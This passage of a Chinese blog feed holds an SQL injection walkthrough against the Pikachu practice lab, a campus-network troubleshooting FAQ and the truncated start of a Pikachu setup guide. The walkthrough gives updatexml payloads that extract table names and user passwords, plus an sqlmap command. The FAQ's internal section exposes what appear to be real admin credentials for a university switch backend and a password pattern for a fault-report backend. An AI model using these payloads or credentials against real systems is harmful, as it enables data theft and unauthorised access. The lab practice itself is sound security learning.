&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~pikachu~&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/31.png"><br>猜数据表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用group_concat()时因数据过长所以显示不完全</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/32.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用limit限制查询数量，每次查询一条结果</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/33.png"><br>猜字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p>猜字段内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询用户名</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line"># 查询密码</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/34.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查询密码时最后一位显示不完全，可能是因为长度太长,将~替换为.就可以显示出来</span><br><span class="line">username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1)),1) or&#x27;</span><br></pre></td></tr></table></figure><p><img src="/CTF/35.png"><br>Sqlmap Payload</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.132.200:8000/vul/sqli/sqli_iu/sqli_reg.php&quot;</span> --data=<span class="string">&quot;username=admin&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit&quot;</span> -p username</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;暴力破解&quot;&gt;&lt;a href=&quot;#暴力破解&quot; class=&quot;headerlink&quot; title=&quot;暴力破解&quot;&gt;&lt;/a&gt;暴力破解&lt;/h1&gt;&lt;h2 id=&quot;基于表单的暴力破解&quot;&gt;&lt;a href=&quot;#基于表单的暴力破解&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://jielunya.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>校园网故障汇总</title>
    <link href="https://jielunya.github.io/2022/11/21/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%95%85%E9%9A%9C%E6%B1%87%E6%80%BB/"/>
    <id>https://jielunya.github.io/2022/11/21/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%95%85%E9%9A%9C%E6%B1%87%E6%80%BB/</id>
    <published>2022-11-21T12:38:19.900Z</published>
    <updated>2022-11-21T17:30:03.743Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题一：开网常见问题"><a href="#问题一：开网常见问题" class="headerlink" title="问题一：开网常见问题"></a>问题一：开网常见问题</h2><h3 id="充进去的钱可不可以退？"><a href="#充进去的钱可不可以退？" class="headerlink" title="充进去的钱可不可以退？"></a>充进去的钱可不可以退？</h3><p>答：在登录页登录后点击蓝色按钮，进入自助服务系统查看，如果余额不为零，退学离校或毕业的同学可以找信息化建设中心的老师退款，其他学生一律顺延到下个学期使用。</p><h3 id="为什么我开网之后还用不了？"><a href="#为什么我开网之后还用不了？" class="headerlink" title="为什么我开网之后还用不了？"></a>为什么我开网之后还用不了？</h3><p>答：接入校园网之后，打开登录页（10.0.0.62）登录，然后点击蓝色按钮进入自主服务系统，查看套餐一栏，如果显示未缴费，那么没有成功开网。如果显示了套餐，开网之后一般需要等待一到三个工作日才能受理成功。</p><h3 id="如何连接、使用校园网？"><a href="#如何连接、使用校园网？" class="headerlink" title="如何连接、使用校园网？"></a>如何连接、使用校园网？</h3><p>①打开WiFi，找到校园网GDIP_WEB并连接（或者电脑端可以选择插网线连接）<br>②连接成功后，在浏览器地址栏输入10.0.0.62<br>③来到登录页面，输入学号及密码即可登录成功（注意同一个账号只能在一台设备上使用）<br>1.WIFI连接：<br><img src="/image/1.png"><br><img src="/image/2.png"><br><img src="/image/3.png"><br><img src="/image/4.png"><br>2.网线连接：<br>将网线把电脑上的网口与宿舍内端口相连，重复如上操作即可。</p><h2 id="问题二：登录页面显示ldap-password-error"><a href="#问题二：登录页面显示ldap-password-error" class="headerlink" title="问题二：登录页面显示ldap password error"></a>问题二：登录页面显示ldap password error</h2><p> <img src="/image/5.png"><br>故障原因：密码输入错误。<br>解决方法：<br>1.检查并重新输入密码以重新登录。<br>2.校园网登录密码与智慧3.0登录密码同步，如近期有更改智慧3.0的登录密码，请注意输入的密码是否为新的智慧3.0的密码。<br>3.如果没有更改智慧3.0密码，也确保密码输入正确的情况下出现这样的情况，可能是网页保存的密码&#x2F;手机快捷输入密码&#x2F;学号（误改）出现了问题，请把账号密码删掉重新手动输入一遍，有必要的情况下可到智慧3.0更改密码然后再用新密码登录。<br> <br>注：智慧3.0修改密码流程如下：<br><img src="/image/6.png"></p><p> </p><h2 id="问题三：登录页面显示inuse-login-again或终端ip已在线"><a href="#问题三：登录页面显示inuse-login-again或终端ip已在线" class="headerlink" title="问题三：登录页面显示inuse ,login again或终端ip已在线"></a>问题三：登录页面显示inuse ,login again或终端ip已在线</h2><p><img src="/image/7.png"></p><p>故障原因：校园网一个账号只能提供一台终端设备进行使用，多个设备同时登录一个账号，将会把第一个设备的账号挤下线。<br>解决方法：<br>1.将第一个使用此账号的校园网注销登录，再用其他设备登录。<br>2.出现此提示后，点击返回（或者刷新页面），再次点击登录，此时会显示登陆成功（已经把其他账号挤下线）。<br>3.如果想要实现电脑和手机同时使用，可使用电脑连接校园网后开启热点供手机使用，亦可用手机连接校园网后开热点供电脑使用。</p><p> </p><h2 id="问题四：登录页面显示oppp-error等问题："><a href="#问题四：登录页面显示oppp-error等问题：" class="headerlink" title="问题四：登录页面显示oppp error等问题："></a>问题四：登录页面显示oppp error等问题：</h2><p><img src="/image/8.png"><br>故障原因：账号登录频繁或账号问题。<br>解决方法：<br>1.刷新页面再次点击登录，可多尝试几次（7次），若多次点击仍然出现，则过一段时间后再尝试。<br>2.长时间出现此提示，则可以向网络管理员提供姓名账号密码联系方式进行反馈。<br>#遇到Oppp error：password error错误的，可在自助服务系统验证密码是否错误，反之则为账号问题。 </p><h2 id="问题五：无法连接校园网，一直提示正在获取ip地址。"><a href="#问题五：无法连接校园网，一直提示正在获取ip地址。" class="headerlink" title="问题五：无法连接校园网，一直提示正在获取ip地址。"></a>问题五：无法连接校园网，一直提示正在获取ip地址。</h2><p><img src="/image/9.png"><br>故障原因：热点信号过弱；热点允许接入的主机数已达上限，新设备进入需要等待热点分配ip地址。<br>解决方法：<br>1.点击wifi设置，将网络忽略（忘记网络），再进行重新连接。<br>2.点击wifi设置，将使用随机MAC更改成使用设备MAC，或者将使用设备MAC更改为使用随机MAC。<br> <img src="/image/10.png"> </p><h2 id="问题六：登录页面显示系统繁忙。"><a href="#问题六：登录页面显示系统繁忙。" class="headerlink" title="问题六：登录页面显示系统繁忙。"></a>问题六：登录页面显示系统繁忙。</h2><p><img src="/image/11.png"><br>故障原因：校园网络使用高峰期会造成网络拥堵，导致网络卡顿、掉线、系统处理繁忙。<br>解决方法：<br>1.刷新页面，多登录几次。<br>2.尽量避开网络高峰期使用。 </p><h2 id="问题七：WIFI找不到GDIP-WEB的信号。"><a href="#问题七：WIFI找不到GDIP-WEB的信号。" class="headerlink" title="问题七：WIFI找不到GDIP_WEB的信号。"></a>问题七：WIFI找不到GDIP_WEB的信号。</h2><p>故障原因：部分区域可能没有覆盖校园网，导致搜索不到校园网信号的情况。<br>解决方法：<br>1．必要时可先用数据流量代替，等到有覆盖范围内再使用校园网。<br>2．如果确定是覆盖范围内的宿舍区找不到GDIP_WEB的信号，则可能是学校机房跳闸，需要联系网络管理员进行重新拉闸。<br>3．若是单个宿舍内没有信号，则可能是无线ap出现了问题，可以联系网络管理员或者到智慧3.0进行网络报障。</p><p> </p><h2 id="问题八：登录成功，但是没有网络。"><a href="#问题八：登录成功，但是没有网络。" class="headerlink" title="问题八：登录成功，但是没有网络。"></a>问题八：登录成功，但是没有网络。</h2><p><img src="/image/12.png"></p><p>故障原因：开通校园网需要等待1-3个工作日，到用户自助服务系统查看，如果有使用时长，但是没有已用流量（或者流量只有一点），则是没有开通成功的情况。<br>解决方法：账号开通是运营商进行处理，如果过了3个工作日依然不能使用，则可以向网络管理员上报账号进行登记处理。 </p><h2 id="问题九：连上了wifi，但是无法进入登录页面。"><a href="#问题九：连上了wifi，但是无法进入登录页面。" class="headerlink" title="问题九：连上了wifi，但是无法进入登录页面。"></a>问题九：连上了wifi，但是无法进入登录页面。</h2><p><img src="/image/13.png"><br>故障原因：登录页面没有被正确解析，导致打不开；页面被安全系统拦截。<br>解决方法：<br>1.查看ip地址是否设置了静态地址，如果是则换成自动获取ip地址（DHCP）。<br>2.手动更改DNS（改成114.114.114.114、223.6.6.6、8.8.8.8等等）<br>3.忘记GDIP_WEB网络，重新连接。<br>4.重置WIFI网络。Pc端在cmd命令中输入netsh winsock reset或者在设置中直接搜“网络重置”，然后点击立即重置；在移动端中同样有网络重置的功能来尝试重置网络。<br>5.更换一个浏览器，输入登录网址：10.0.0.62 </p><h2 id="问题十：苹果用户熄屏后自动断开校园网。"><a href="#问题十：苹果用户熄屏后自动断开校园网。" class="headerlink" title="问题十：苹果用户熄屏后自动断开校园网。"></a>问题十：苹果用户熄屏后自动断开校园网。</h2><p>故障原因：苹果系统的特殊性。<br>解决方法：<br>1.开启WIFI设置里的自动加入，将自动登录关闭，手动打开浏览器输入登陆页面网址进行登录。<br>2.将WIFI设置里的HTTP代理设置为自动。<br>3.将私有地址关闭。<br>4.关闭省电模式。<br> <img src="/image/14.png"> </p><h2 id="问题十一：登录之后，注销不了。"><a href="#问题十一：登录之后，注销不了。" class="headerlink" title="问题十一：登录之后，注销不了。"></a>问题十一：登录之后，注销不了。</h2><p><img src="/image/15.png"><br>故障原因：校园网登录状态发生变化。<br>解决方法：换个设备登录，把原来的设备登录挤掉。</p><p> </p><h2 id="问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点"><a href="#问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点" class="headerlink" title="问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点"></a>问题十二：WIN10使用网线，右下角显示小地球，可以联网，但是开不了热点</h2><p>故障原因：网络状态还没刷新。<br>解决方法：<br>1.连一下GDIP_WEB这个wifi，随后断开，即可刷新以太网状态。<br>2.拔插一下网线。<br>3.在注册表<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet]<br>“ActiveDnsProbeHost”&#x3D;<br>“ActiveDnsProbeHostV6”&#x3D;<br>“ActiveWebProbeContent”&#x3D;<br>“ActiveWebProbeContentV6”&#x3D;<br>“ActiveWebProbeHost”&#x3D;<br>“ActiveWebProbeHostV6”&#x3D;<br>“ActiveWebProbePath”&#x3D;<br>“ActiveWebProbePathV6”&#x3D;<br>的这几个值负责开机后的网络状态检测，原来认证服务器一直是dns.msftncsi.com，微软换了其他服务器（系统更新后出的问题），这个新的服务器由于LSP和国内运营商的dns劫持等等原因的影响，造成了无法正常认证。所以把它改回原来的认证服务器就好了。<br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet]<br>“ActiveDnsProbeContent”&#x3D;”131.107.255.255”<br>“ActiveDnsProbeContentV6”&#x3D;”fd3e:4f5a:5b81::1”<br>“ActiveDnsProbeHost”&#x3D;”dns.msftncsi.com”<br>“ActiveDnsProbeHostV6”&#x3D;”dns.msftncsi.com”<br>“ActiveWebProbeContent”&#x3D;”Microsoft NCSI”<br>“ActiveWebProbeContentV6”&#x3D;”Microsoft NCSI”<br>“ActiveWebProbeHost”&#x3D;”<a href="http://www.msftncsi.com&quot;/">www.msftncsi.com&quot;</a><br>“ActiveWebProbeHostV6”&#x3D;”ipv6.msftncsi.com”<br>“ActiveWebProbePath”&#x3D;”ncsi.txt”<br>“ActiveWebProbePathV6”&#x3D;”ncsi.txt”<br>“CaptivePortalTimer”&#x3D;dword:00000000<br>“CaptivePortalTimerBackOffIncrementsInSeconds”&#x3D;dword:00000005<br>“CaptivePortalTimerMaxInSeconds”&#x3D;dword:0000001e<br>“EnableActiveProbing”&#x3D;dword:00000001<br>“PassivePollPeriod”&#x3D;dword:0000000f<br>“StaleThreshold”&#x3D;dword:0000001e<br>“WebTimeout”&#x3D;dword:00000023</p><h2 id="问题十三：-“内核接口不可用，请检查内核命令跟内核版本！”"><a href="#问题十三：-“内核接口不可用，请检查内核命令跟内核版本！”" class="headerlink" title="问题十三： “内核接口不可用，请检查内核命令跟内核版本！”"></a>问题十三： “内核接口不可用，请检查内核命令跟内核版本！”</h2><p><img src="/image/17.png"><br>解决方法：<br>1.忘记网络重新连接后，换个浏览器打开登陆页面<a href="http://10.0.0.62/">http://10.0.0.62/</a><br>2.更改mac(切换一下)；<br>3.清理下浏览器缓存之后再重新连接。<br>4.打开右下角网络连接图标，点击网络和Internet设置，找到打开页面左边的代理，关闭里面所有打开的按钮。 </p><h2 id="问题十四：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了"><a href="#问题十四：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了" class="headerlink" title="问题十四：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了"></a>问题十四：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了</h2><p><img src="/image/18.png"><br>解决方法：点击WiFi-网络和Internet设置-更改设配器选项-WLAN模块-属性-共享-勾选</p><p> </p><h2 id="问题十五：电脑连接校园网无法打开登陆页面。"><a href="#问题十五：电脑连接校园网无法打开登陆页面。" class="headerlink" title="问题十五：电脑连接校园网无法打开登陆页面。"></a>问题十五：电脑连接校园网无法打开登陆页面。</h2><p><img src="/image/19.png"><br>解决方法：<br>1.点击GDIP_WEB的“属性”，将随机硬件地址开启（关闭）。<br><img src="/image/20.png"><br>安卓系统：点击WiFi右边箭头，找到隐私-切换另一个MAC<br>鸿蒙系统：长按WiFi-点击“修改网络”-找到隐私-切换另一个MAC<br>2.重置网络，右击开始菜单—- “Windows PowerShell (管理员)”，输入：<br>netsh winsock reset<br>回车<br>netsh int ip reset<br>回车<br>ipconfig &#x2F;release<br>回车<br>ipconfig &#x2F;renew<br>回车<br>ipconfig &#x2F;flushdns<br>回车<br>ipconfig &#x2F;registerdns<br>回车<br>然后右击开始菜单—运行，输入<br>inetcpl.cpl<br>回车<br>—–高级，还原一下高级设置。<br>然后任务栏搜索框输入<br>Internet<br>回车<br>打开Internet选项—高级—使用TLS1.0 使用TLS1.1 使用TLS1.2 使用TLS1.3（实验） 这4个打上勾。<br>执行完毕上述方案后，重启设备。<br>然后重置一下Edge：<br>浏览器右上角3个点，设置，重置设置，还原其默认值。</p><h2 id="问题十六：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了"><a href="#问题十六：电脑连上校园网之后开了热点但是手机连不到-x2F-用不了" class="headerlink" title="问题十六：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了"></a>问题十六：电脑连上校园网之后开了热点但是手机连不到&#x2F;用不了</h2><p>解决方法：点击WiFi-网络和Internet设置-更改设配器选项-WLAN模块-属性-共享-勾选<br><img src="/image/22.png"></p><h2 id="问题十七：电脑连接校园网无法打开登陆页面。"><a href="#问题十七：电脑连接校园网无法打开登陆页面。" class="headerlink" title="问题十七：电脑连接校园网无法打开登陆页面。"></a>问题十七：电脑连接校园网无法打开登陆页面。</h2><p><img src="/image/25.png"></p><p>解决方法：</p><ol><li>点击GDIP_WEB的“属性”，将随机硬件地址开启（关闭）。<br> <img src="/image/26.png"><br>安卓系统：点击WiFi右边箭头，找到隐私-切换另一个MAC<br>鸿蒙系统：长按WiFi-点击“修改网络”-找到隐私-切换另一个MAC</li><li>重置网络，右击开始菜单—- “Windows PowerShell (管理员)”，输入：<br>netsh winsock reset<br>回车<br>netsh int ip reset<br>回车<br>ipconfig &#x2F;release<br>回车<br>ipconfig &#x2F;renew<br>回车<br>ipconfig &#x2F;flushdns<br>回车<br>ipconfig &#x2F;registerdns<br>回车<br>然后右击开始菜单—运行，输入<br>inetcpl.cpl<br>回车<br>—–高级，还原一下高级设置。<br>然后任务栏搜索框输入<br>Internet<br>回车<br>打开Internet选项—高级—使用TLS1.0 使用TLS1.1 使用TLS1.2 使用TLS1.3（实验） 这4个打上勾。<br>执行完毕上述方案后，重启设备。<br>然后重置一下Edge：<br>浏览器右上角3个点，设置，重置设置，还原其默认值。</li><li>如果如下图所示登录页面提示，可以考虑是不是开了代理，是的话关掉即可。<br><img src="/image/27.png"><br><img src="/image/28.png"></li></ol><h2 id="问题十八：校园网经常卡怎么办"><a href="#问题十八：校园网经常卡怎么办" class="headerlink" title="问题十八：校园网经常卡怎么办"></a>问题十八：校园网经常卡怎么办</h2><p><img src="/image/29.png"><br>首先，可以先自己排查一下，比如可以自己测试一下网速是否达标；借用同学的校园网账号在自己的设备上登陆查看是否有问题；尝试将网线插到其他端口上；如果发现网络卡是账号或者是端口问题，可以在网上进行保修，服务网址：网络故障登记 (gdqy.edu.cn)<br>正常网速：</p><p>正常登陆：<br><img src="/image/30.png"></p><p>网速慢的相关内容<br>👉🏻在教室上课的时候，很多同学同时连接一个接入点ap，共享这个ap无线信号提供的非常有限带宽;加上上课期间课室网上设备多，这个时候校园网慢是正常的。<br>👉🏻在一定区域范围内，使用某个运营商上网的人太多了，网速自然会慢。而在校园网发生大规模故障的时候，会有更多的学生转用数据上网，从而加剧了这个问题。</p><h2 id="问题十九：校园网的时间纠正"><a href="#问题十九：校园网的时间纠正" class="headerlink" title="问题十九：校园网的时间纠正"></a>问题十九：校园网的时间纠正</h2><p>时间出错解决办法：<br>在连接校园网前把自动同步网络时间和网络时区的功能都给关闭。<br>如果时间已经错了，首先断开校园网用数据连接，然后关闭自动同步时间时区，重启设备，再重新打开自动同步，时间正确后关闭自动同步。</p><h2 id="问题二十：在宿舍突然搜索不到WiFi信号了。"><a href="#问题二十：在宿舍突然搜索不到WiFi信号了。" class="headerlink" title="问题二十：在宿舍突然搜索不到WiFi信号了。"></a>问题二十：在宿舍突然搜索不到WiFi信号了。</h2><p>重启自己的手机试试看，如果重启后还是无效，并且询问周围同学也是无法搜索到WiFi信号的话（或者很弱，只有一两格WiFi信号），请到QQ故障群反馈，后续会有相关人员前去查看的。</p><h2 id="问题二十一：校园网连续性中断，但重新登陆正常"><a href="#问题二十一：校园网连续性中断，但重新登陆正常" class="headerlink" title="问题二十一：校园网连续性中断，但重新登陆正常"></a>问题二十一：校园网连续性中断，但重新登陆正常</h2><p>可能是账号冲突，检查一下是不是其他人登陆了自己的账号导致账号冲突。或者修改密码重新登陆。</p><h2 id="问题二十二：在教室连不上校园网"><a href="#问题二十二：在教室连不上校园网" class="headerlink" title="问题二十二：在教室连不上校园网"></a>问题二十二：在教室连不上校园网</h2><p>👉🏻如果把一栋楼的网络系统比喻成一间饭店。这个系统里面ip池的ip数量相当于饭店里面的座位数。<br>👉🏻当你去饭店发现人坐满了你就不能坐进去。<br>当你连WiFi的时候，ip用完了你也就连不上了。<br>⚠️获取不了ip在教学楼比较常见<br>👉🏻解决办法是早早去到教室早早连上WiFi，课间不要把手机带出课室（带出课室后可能会断开，断开就可能回去就连不上了）</p><h2 id="问题二十三：南区无线网络覆盖范围（2022-4-1-）"><a href="#问题二十三：南区无线网络覆盖范围（2022-4-1-）" class="headerlink" title="问题二十三：南区无线网络覆盖范围（2022.4.1.）"></a>问题二十三：南区无线网络覆盖范围（2022.4.1.）</h2><p>1号楼办公楼1楼部分区域<br>2号楼全部课室<br>6号楼一楼图书馆<br>7号楼食堂1、2楼<br>8号楼教师公寓以及一楼医务室附近<br>9、10、11、12全部学生宿舍<br>北区除了校道、操场、图书馆四五楼、一饭食堂高层区、二饭，其他地方基本覆盖</p><h2 id="问题二十四-电脑WLAN图标不见了"><a href="#问题二十四-电脑WLAN图标不见了" class="headerlink" title="问题二十四 电脑WLAN图标不见了"></a>问题二十四 电脑WLAN图标不见了</h2><p><img src="/image/31.png"><br>故障原因：系统的某项服务被关闭。<br>解决方法：win+R后输入：services.msc 点击确定（或按回车键）打开服务。<br>找到：WLAN AutoConfig（无线服务）→启动类型→自动→应用→启动→确定<br><img src="/image/32.png"><br><img src="/image/33.png"><br><img src="/image/34.png"></p><h2 id="部门内部常用"><a href="#部门内部常用" class="headerlink" title="部门内部常用"></a>部门内部常用</h2><h3 id="一、-相关网站"><a href="#一、-相关网站" class="headerlink" title="一、  相关网站"></a>一、  相关网站</h3><p>（一）自助服务系统：用户自助服务系统<br>备注：<br>1、可以通过点击登录页的蓝色按钮进入。<br>2、在实训楼机房电脑查用户缴费信息，只能直接打开该网址。<br><img src="/image/35.png"><br><img src="/image/36.png"></p><p>（二）交换机后台：<a href="http://what.gdqy.edu.cn/">http://what.gdqy.edu.cn/</a><br>备注：账号guest，密码Nic88576120。绿色正常，红色挂机。<br><img src="/image/37.png"></p><p>（三）报障后台：<a href="http://bz.gdqy.edu.cn/net.jsp">http://bz.gdqy.edu.cn/net.jsp</a><br>备注：账号密码都是nic+楼栋数，例如十三十四栋账号和密码都是nic1314<br><img src="/image/38.png"></p><h3 id="二、网络故障排除"><a href="#二、网络故障排除" class="headerlink" title="二、网络故障排除"></a>二、网络故障排除</h3><p>通过控制变量找出问题的具体文章，在进行处理</p><ol><li>如果出现规模性的网络故障，例如无法获取ip地址，或者大批账号出现oppp错误，那么及时反映、并按照最新通知处理。例如oppp错误的可能会收集一些问题账号测试，但是有的时候不用。</li><li>如果非规模性故障，可以先确定是账号问题还是设备问题。例如上不了知乎，可以问问用户是不是电脑和手机都有同样的问题。必要时向用户索要账号密码，测试，如果自己的账号在一同电脑上没有问题，但是用户的登录用户的账号会出现问题，那么就是账号问题，反之是设备问题。#如果用户的账号没有问题，但是用户手机电脑都不能上网，可能是机房交换机不正常工作（这种情况下他身边的人也用不了），可能是他的手机和电脑同时分别出现了故障，或者他违规使用路由器。</li><li>如果确定是设备问题的话再针对具体表现进行处理。</li></ol><h3 id="三、登录及相关故障"><a href="#三、登录及相关故障" class="headerlink" title="三、登录及相关故障"></a>三、登录及相关故障</h3><p>（一）登录页报错(如oppp error问题)<br>1、可以提醒用户暂时先别登录了，等15分钟左右之后再试试。<br>2、如果15分钟左右之后还是出现同样的错误提示，那么收集姓名（判断是否填错） 、电话（极少会用到） 、账号、密码、运营商转发给对应的运营商临时负责人。<br>#移动上报至软件212张涛师兄，电信上报至计算机212诸定航师兄。<br>#如果最近出现了大规模的网络故障，则按通知确定是否收集账号。<br>#该处理办法不包括密码错误。<br>#遇到Oppp error：password error错误的，现在自助服务系统验证他的密码是否真的错的，如果不是，那就是账号问题。<br>#要检查账号的运营商、问题是否真的存在<br>（二）登录页显示不安全、证书有问题<br>可能是网址输入错误，是<a href="http://10.0.0.62/">http://10.0.0.62</a>,    而不是 <a href="https://10.0.0.62/">https://10.0.0.62。</a><br>输入打多S变成不安全网页。<br><img src="/image/39.png"></p><h3 id="四、机房相关故障"><a href="#四、机房相关故障" class="headerlink" title="四、机房相关故障"></a>四、机房相关故障</h3><p>（一）交换机<br>如果交换机后台显示某一个机房的所有设备都挂了，往往是机房供电除了问题。一般都是机房供电总闸跳闸导致的。机房供电问题导致的情况，一般在QQ故障群会有动静的。所以如果QQ故障去忽然有不少人说不能WiFi没了，WiFi信号很弱，网线上不了网的话，就赶紧查查交换机后台。但是也有可能故障群是没有动静的。雷雨天气过了，检查一下交换机后台，这个时候查到电闸跳闸的可能性比较大。但是打雷的时候不要去机房处理，注意个人人身安全。有时候交换机可能没有挂，但是不正常工作，把机柜的电断了再通电，重启交换机可能就解决办法了。注意要把影响范围缩小：如果确定只是无线用不了，那么拔掉无线机柜的插头再插就可以了，不要开关总闸。<br>（二）端口</p><ol><li>先用测线仪测一下端口（第1236四个灯是都亮，那么就可以正常使用了），应该是有其中一个或者两个灯是不亮的。</li><li>先用一字螺丝刀刮一下里面的金属条，注意不要太大力，以免里面的金属条无法正常回弹到原位，如果恢复，后继操作不用进行（处理金属条氧化问题）。</li><li>由于拆面板，换端口比较困难，所以建议先去机房找到配线架上面对应的端口，然后用测线仪测一测配线架端口到宿舍端口的问题，验证是不是配线架端口到宿舍端口的问题。如果是，那就是宿舍端口的问题了。如果不是，那可能要进行跳线。如果是的话，把宿舍端口拆下来，检查是否有金属条无法正常回弹，如果有的话，试着用尖锐的东西复原。如果没有的话，可以换端口了。</li></ol><p>（三）跳线<br>如果验证了宿舍端口到机房配线架端口的线路是正常的话，可能测试交换机端口的问题了。用测线仪测试交换机端口，测线仪的1236四个灯有若干个不亮的话，那就是交换机端口的问题，需要进行跳线了。本来通过一根网线把配线架的端口和交换机的端口连接起来的，现在交换机的端口坏了，那么我们就要用另一跟网线把配线架上面的端口和交换机其他好的端口相连接即可。</p><h3 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h3><p>如何更改电脑网络DNS (baidu.com)     &#x2F;&#x2F;win10中修改ip，dns<br><a href="https://baijiahao.baidu.com/s?id=1612906041166793439&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1612906041166793439&amp;wfr=spider&amp;for=pc</a><br>Win7系统电脑怎么设置IP地址-百度经验 (baidu.com)     &#x2F;&#x2F;win7中修改ip，dns<br><a href="https://jingyan.baidu.com/article/e8cdb32b6c3b8137052badf7.html">https://jingyan.baidu.com/article/e8cdb32b6c3b8137052badf7.html</a><br>win10怎么重置网络配置 如何重置电脑网络设置-百度经验 (baidu.com)     &#x2F;&#x2F;win10中重置网络<br><a href="https://jingyan.baidu.com/article/1612d5000a7534a20e1eee8c.html">https://jingyan.baidu.com/article/1612d5000a7534a20e1eee8c.html</a><br>Windows 7 操作系统重置网络命令-百度经验 (baidu.com)     &#x2F;&#x2F;win7中重置网络<br><a href="https://jingyan.baidu.com/article/3ea51489b483ec52e61bba91.html">https://jingyan.baidu.com/article/3ea51489b483ec52e61bba91.html</a><br>如何将win10电脑设置成共享wifi热点-百度经验 (baidu.com)     &#x2F;&#x2F;win10中设置网络热点<br><a href="https://jingyan.baidu.com/article/fec4bce2b84fc6f2618d8bf0.html">https://jingyan.baidu.com/article/fec4bce2b84fc6f2618d8bf0.html</a><br>详解win7如何设置wifi热点 - Win7之家 (windows7en.com)     &#x2F;&#x2F;win7中设置网络热点(不推荐)<br><a href="http://www.windows7en.com/jiaocheng/47115.html">http://www.windows7en.com/jiaocheng/47115.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;问题一：开网常见问题&quot;&gt;&lt;a href=&quot;#问题一：开网常见问题&quot; class=&quot;headerlink&quot; title=&quot;问题一：开网常见问题&quot;&gt;&lt;/a&gt;问题一：开网常见问题&lt;/h2&gt;&lt;h3 id=&quot;充进去的钱可不可以退？&quot;&gt;&lt;a href=&quot;#充进去的钱可不可以退</summary>
      
    
    
    
    <category term="故障问题" scheme="https://jielunya.github.io/categories/%E6%95%85%E9%9A%9C%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="校园网" scheme="https://jielunya.github.io/tags/%E6%A0%A1%E5%9B%AD%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>搭建pikachu环境</title>
    <link href="https://jielunya.github.io/2022/11/21/%E6%90%AD%E5%BB%BApikachu%E7%8E%AF%E5%A2%83/"/>
    <id>https://jielunya.github.io/2022/11/21/%E6%90%AD%E5%BB%BApikachu%E7%8E%AF%E5%A2%83/</id>
    <published>2022-11-21T12:38:19.897Z</published>
    <updated>2022-11-20T14:00:04.795Z</updated>
    
    <content type="html"><![CDATA[<p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，可以选择pikahcu。</p><h1 id="Kali系统下搭建："><a href="#Kali系统下搭建：" class="headerlink" title="Kali系统下搭建："></a>Kali系统下搭建：</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="attr">https</span>:<span class="comment">//github.com/zhuifengshaonianhanlu/pikachu/archive/refs/heads/master.zip</span></span><br><span class="line"></span><br><span class="line">如遇到拒绝连接，则可以手动下载，拉到kali桌面。</span><br><span class="line"></span><br><span class="line">在桌面右键打开终端，输入命令，将压缩包解压。</span><br><span class="line">unzip pikachu-master.<span class="property">zip</span></span><br><span class="line"></span><br><span class="line">将文件夹放到/<span 